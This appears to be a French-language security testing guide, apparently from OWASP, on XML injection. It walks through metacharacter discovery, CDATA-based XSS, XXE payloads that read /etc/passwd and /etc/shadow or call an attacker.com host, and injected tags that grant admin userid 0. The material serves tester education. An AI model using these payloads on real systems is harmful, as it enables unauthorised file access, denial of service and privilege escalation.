## Sommaire

Les tests d'injection XML consistent à essayer d'injecter un document
XML dans l'application. Si l'analyseur XML ne valide pas correctement
les données, ce test sera positif.

Cettee setion présente des exemples pratiques d'injections XML. Tout
d'abord, nous allons définir un style de communication XML et en
expliquer les principes de fonctionnement. Puis nous allons présenter la
méthode de découverte pour injecter des méta-caractères XML. Après cette
première étape, le testeur aura quelques informations sur la structure
XML, et pourra donc essayer d'injecter des données et balises XML
(injection de balises).

## Comment tester

Supposons qu'une application web utilise une communication de type XML
pour procéder à l'enregistrement d'utilisateurs. Cela se fait en créant
et ajoutant un nouveau noeud <user> dans un fichier xmlDb.

Supposons que ce fichier xmlDB ressemble à ce qui suit :

**`<?xml``   ``version="1.0"``   ``encoding="ISO-8859-1"?>` `<users>`
`<user>` `<username>gandalf</username>` `<password>!c3</password>`
`<userid>0</userid>` `<mail>gandalf@middleearth.com</mail>` `</user>`
`<user>` `<username>Stefan0</username>` `<password>w1s3c</password>`
`<userid>500</userid>` `<mail>Stefan0@whysec.hmm</mail>` `</user>`
`</users>`**

Lorsqu'un utilisateur s'inscrit lui-même en renseignant un formulaire
HTML, l'application reçoit les entrées de l'utilisateur dans une requête
standard. Pour des raisons de simplicité, supposons que cette requête
est en GET.

Par exemple, les valeurs suivantes :

**`Username:``   ``tony`**
**`Password:``   ``Un6R34kb!e`**
**`E-mail:``   ``s4tan@hell.com`**

vont produire la requête :

`http://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com`

L'application construit ensuite le noeud suivant :

**`<user>` `<username>tony</username>` `<password>Un6R34kb!e</password>`
`<userid>500</userid>` `<mail>s4tan@hell.com</mail>` `</user>`**

qui va être ajouté au fichier xmlDb :

**`<?xml``   ``version="1.0"``   ``encoding="ISO-8859-1"?>` `<users>`
`<user>` `<username>gandalf</username>` `<password>!c3</password>`
`<userid>0</userid>` `<mail>gandalf@middleearth.com</mail>` `</user>`
`<user>` `<username>Stefan0</username>` `<password>w1s3c</password>`
`<userid>500</userid>` `<mail>Stefan0@whysec.hmm</mail>` `</user>`
`<user>` `<username>tony</username>` `<password>Un6R34kb!e</password>`
`<userid>500</userid>` `<mail>s4tan@hell.com</mail>` `</user>`
`</users>`**

### Découverte

La première étape pour tester la présence de vulnérabilités d'injections
XML dans une application consiste à essayer d'insérer des
méta-caractères XML.

Les méta-caractères XML sont :

  - '''Simple quote : ' ''' - Quand il n'est pas nettoyé, ce caractère
    peut déclencher une exception pendant l'analyse XML, si la valeur
    injectée est destinée à faire partie d'une valeur d'attribut d'une
    balise.

Par exemple, supposons l'attribut suivant :

**<node attrib='$inputValue'/>**

Donc si:

**`inputValue``   ``=``   ``foo`**`'`

est instantié et ensuite inséré dans la valeur d'attrib :

**`<node``   ``attrib='foo''/>`**

alors, le document XML résultant ne sera pas bien formé.

  - '''Double quote : " '''- ce caractère a la même signification que la
    simple quote et peut être utilisé si l'attribut est entouré de
    doubles quotes.

**`<node``   ``attrib="$inputValue"/>`**

Donc si :

**`$inputValue``   ``=``   ``foo"`**

la substitution donne:

**`<node``   ``attrib="foo""/>`**

ce qui résulte en un document XML invalide.

  - **Chevrons : \> and \<** - En ajoutant un chevron ouvrant ou fermant
    dans une entrée utilisateur comme suit :

**`Username``   ``=``   ``foo<`**

l'application va construire le nouveau noeud :

**`<user>` `<username>foo<</username>` `<password>Un6R34kb!e</password>`
`<userid>500</userid>` `<mail>s4tan@hell.com</mail>` `</user>`**

mais du fait de la présence du chevron ouvrant '\<', le document XML
résultant est invalide.

  - **Balise de commentaire: \<\!--/--\>** - Cette séquence de
    caractères est interprêtée comme le début ou la fin d'un
    commentaire. Donc en injectant l'une d'elle dans le paramètre
    Username :

**`Username``   ``=``   ``foo<!--`**

l'application va construire le noeud suivant :

**`<user>` `<username>foo<!--</username>`
`<password>Un6R34kb!e</password>` `<userid>500</userid>`
`<mail>s4tan@hell.com</mail>` `</user>`**

qui ne sera pas une séquence XML valide.

  - '''esperluette : & '''- L'esperluette est utilisée dans la syntaxe
    XML pour représenter les entités. Le format d'une entité est
    '\&symbole;'. Une entité est mise en correspondance avec un
    caractère Unicode.

Par exemple :

**`<tagnode><</tagnode>`**

est bien formé et valide, et représente le caractère ASCII '\<'.

Si '&' n'est pas lui-même encodé avec &, il peut être utilisé pour
tester une injection XML.

Dans les faits, si une telle entrée est fournie :

**`Username``   ``=``   ``&foo`**

un nouveau noeud va être créé :

**`<user>` `<username>&foo</username>` `<password>Un6R34kb!e</password>`
`<userid>500</userid>` `<mail>s4tan@hell.com</mail>` `</user>`**

Mais une fois de plus, le document n'est pas valide : \&foo n'est pas
terminé par ';' l'entité \&foo; est indéfinie.

  - **Les délimiteurs de section CDATA : \<\!\[CDATA\[ / \]\]\>** - Les
    sections CDATA sont utilisées pour échapper des blocks de texte
    contenant des caractères qui autrement seraient reconnus comme des
    balises. En d'autres mots, les caractères d'une section CDATA ne
    sont pas analysés par l'analyseur XML.

Par exemple, nous avons besoin de représenter la chaîne '<foo>' dans un
noeud texte, une section CDATA peut être utilisée :

**`<node>` `<![CDATA[<foo>]]>` `</node>`**

de telle manière '<foo>' ne sera pas analysé comme une balise et sera
considérée comme des données caractères.

Si un noeud est construit de la manière suivante :

**`<username><![CDATA[<$userName]]></username>`**

le testeur peut essayer d'injecter une chaîne de fin de CDATA '\]\]\>'
afin de rendre le document XML invalide.

**`userName``   ``=``   ``]]>`**

qui va devenir :

**<username><![CDATA[]]>`]]>`</username>**

qui n'est pas un fragment XML valide.

Un autre test peut être fait sur les balises CDATA. Supposons que le
codument XML est traité pour générer une page HTML. Dans ce cas, les
délimiteurs de section CDATA pourraient être simplement supprimés sans
autre inspection de leur contenu. Ainsi, il est possible d'injecter les
balises HTML qui seront incluses dans la page générée, contournant
complétement les routines de validation.

Voyons un exemple concret. Supposons que nous ayons un noeud contenant
du texte qui sera affiché :

**`<html>` `$HTMLCode` `</html>`**

Alors un attaquant peut fournir l'entrée suivante :

**`$HTMLCode``   ``=``
 ``<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>`**

et obtenir le noeud suivant :

**`<html>`
`<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>`
`</html>`**

Pendant le traitement, les délimiteurs de la section CDATA sont
supprimés, pour générer le code HTML suivant :

`'''`

<script>

alert('XSS')

</script>

'''

Le résultat est que l'application est vulnérable aux XSS.

**Entités externes :** L'ensemble des entités valides peut être étendu
en définissant de nouvelles entités. Si la définition d'une entité est
une URI, c'est une entité dite externe. Si l'analyseur n'est pas
configuré autrement, les entités externes le forcent à accéder à la
ressource spécifiée par l'URI (fichier local ou distant). Ce
comportement expose l'application aux attaques XXE (attaques XML
eXternal Entity), qui peuvent être utilisées pour causer des dénis de
service sur le système local, pour obtenir un accès non-autorisé à des
fichiers sur la machine locale, pour scanner des machines distantes, et
pour causer des dénis de service sur des systèmes distants.

Pour tester les vulnérabilités XXE, on peut utiliser l'entrée suivante :

**`<?xml``   ``version="1.0"``   ``encoding="ISO-8859-1"?>`
`<!DOCTYPE``   ``foo``   ``[` `<!ELEMENT``   ``foo``   ``ANY``   ``>`
`<!ENTITY``   ``xxe``   ``SYSTEM``   ``"file:///dev/random"``
 ``>]><foo>&xxe;</foo>`**

Ce test va faire planter le serveur web (sur un système UNIX), si
l'analyseur XML tente de substituer l'entité avec le contenu du fichier
/dev/random.

D'autres tests utiles :

**`<?xml``   ``version="1.0"``   ``encoding="ISO-8859-1"?>`
`<!DOCTYPE``   ``foo``   ``[` `<!ELEMENT``   ``foo``   ``ANY``   ``>`
`<!ENTITY``   ``xxe``   ``SYSTEM``   ``"file:///etc/passwd"``
 ``>]><foo>&xxe;</foo>` `<?xml``   ``version="1.0"``
 ``encoding="ISO-8859-1"?>` `<!DOCTYPE``   ``foo``   ``[` `<!ELEMENT``
 ``foo``   ``ANY``   ``>` `<!ENTITY``   ``xxe``   ``SYSTEM``
 ``"file:///etc/shadow"``   ``>]><foo>&xxe;</foo>` `<?xml``
 ``version="1.0"``   ``encoding="ISO-8859-1"?>` `<!DOCTYPE``   ``foo``
 ``[` `<!ELEMENT``   ``foo``   ``ANY``   ``>` `<!ENTITY``   ``xxe``
 ``SYSTEM``   ``"file:///c:/boot.ini"``   ``>]><foo>&xxe;</foo>`
`<?xml``   ``version="1.0"``   ``encoding="ISO-8859-1"?>` `<!DOCTYPE``
 ``foo``   ``[` `<!ELEMENT``   ``foo``   ``ANY``   ``>` `<!ENTITY``
 ``xxe``   ``SYSTEM``   ``"http://www.attacker.com/text.txt"``
 ``>]><foo>&xxe;</foo>`**

### Injections de balises

Une fois que la première étape est accomplie, le testeur possède
quelques informations sur la structure du document XML. Il va ensuite
pouvoir essayer d'injecter des données et balises XML. L'exemple suivant
décrit une attaque d'escalade de privilèges.

Considérons l'application vue précédemment. En insérant les valeurs
suivantes :

**`Username:``   ``tony`**
**`Password:``   ``Un6R34kb!e`**
**`E-mail:``
 ``s4tan@hell.com`</mail><userid>`0`</userid><mail>`s4tan@hell.com`**

l'application va construire un nouveau noeud et l'ajouter à la base de
données XML :

**`<?xml``   ``version="1.0"``   ``encoding="ISO-8859-1"?>` `<users>`
`<user>` `<username>gandalf</username>` `<password>!c3</password>`
`<userid>0</userid>` `<mail>gandalf@middleearth.com</mail>` `</user>`
`<user>` `<username>Stefan0</username>` `<password>w1s3c</password>`
`<userid>500</userid>` `<mail>Stefan0@whysec.hmm</mail>` `</user>`
`<user>` `<username>tony</username>` `<password>Un6R34kb!e</password>`
`<userid>500</userid>`
`<mail>s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com</mail>`
`</user>` `</users>`**

Le fichier XML résultant est bien formé. De plus, il est probable que,
pour l'utilisateur tony, la valeur associée à la balise userid soit
celle qui apparît en dernier, c'est-à-dire 0 (l'ID de l'administrateur).
En d'autres mots, nous avons injecté un utilisateur avec les privilèges
d'administration.

Le seul problème est que la balise userid apparaît deux fois dans le
dernier noeud utilisateur. Souvent les documents XML sont associés à un
schéma ou un DTD et sont rejetés s'ils ne les respectent pas.

Supposons que le document XML soit spécifié par le DTD suivant :

**`<!DOCTYPE``   ``users``   ``[` `<!ELEMENT``   ``users``
 ``(user+)``   ``>` `<!ELEMENT``   ``user``
 ``(username,password,userid,mail+)``   ``>` `<!ELEMENT``
 ``username``   ``(#PCDATA)``   ``>` `<!ELEMENT``   ``password``
 ``(#PCDATA)``   ``>` `<!ELEMENT``   ``userid``   ``(#PCDATA)``   ``>`
`<!ELEMENT``   ``mail``   ``(#PCDATA)``   ``>` `]>`**

Remarquons que le noeud userid est défini avec une cardinalité de 1.
Dans ce cas, l'attaque précédente (et d'autres attaques simples) ne
fonctionnera pas si le document XML est validé avec son DTD avant que le
traitement ait lieu.

Cependant ce problème peut être résolu si le testeur contrôle la valeur
des quelques noeuds précédents l'intru (userid dans cet exemple). En
fait, le testeur peut commenter un tel noeud, en injectant une séquenc
de debut/fin de commentaire :

**`Username:``   ``tony`**
**`Password:``   ``Un6R34kb!e</password><!--`**
**`E-mail:``   ``--><userid>0</userid><mail>s4tan@hell.com`**

Dans ce cas, la base XML finale sera :

**`<?xml``   ``version="1.0"``   ``encoding="ISO-8859-1"?>` `<users>`
`<user>` `<username>gandalf</username>` `<password>!c3</password>`
`<userid>0</userid>` `<mail>gandalf@middleearth.com</mail>` `</user>`
`<user>` `<username>Stefan0</username>` `<password>w1s3c</password>`
`<userid>500</userid>` `<mail>Stefan0@whysec.hmm</mail>` `</user>`
`<user>` `<username>tony</username>`
`<password>Un6R34kb!e</password><!--</password>` `<userid>500</userid>`
`<mail>--><userid>0</userid><mail>s4tan@hell.com</mail>` `</user>`
`</users>`**

Le noeud *userid* d'origine a été mis en commentaire, ne laissant que le
noeud injecté. Ce document respecte maintenant les règles de son DTD.

## Outils

  - XML Injection Fuzz Strings (from wfuzz tool) -
    <https://wfuzz.googlecode.com/svn/trunk/wordlist/Injections/XML.txt>

## Références

**Whitepapers**
\* \[1\] Alex Stamos: "Attacking Web Services" -
<http://www.owasp.org/images/d/d1/AppSec2005DC-Alex_Stamos-Attacking_Web_Services.ppt>
\* Gregory Steuck, "XXE (Xml eXternal Entity) attack",
<http://www.securityfocus.com/archive/1/297714>